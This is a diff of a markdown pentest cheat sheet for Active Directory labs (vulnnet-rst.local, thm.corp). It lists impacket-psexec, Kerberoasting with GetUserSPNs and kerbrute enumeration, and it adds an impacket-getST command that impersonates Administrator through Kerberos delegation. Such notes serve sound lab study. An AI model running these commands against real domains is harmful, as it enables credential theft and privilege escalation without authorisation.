@@ -84,6 +84,10 @@ impacket-psexec vulnnet-rst.local/a-whitehat@10.10.216.107
 ```
 impacket-GetUserSPNs vulnnet-rst.local/$username:$password -dc-ip $ip -request
 ```
+## Impacket-getST
+```
+impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.corp/DARLA_WINTERS
+```
 # Kerbrute
 ```
 kerbrute -users Username_wordlist.txt -domain vulnnet-rst.local -dc-ip $ip
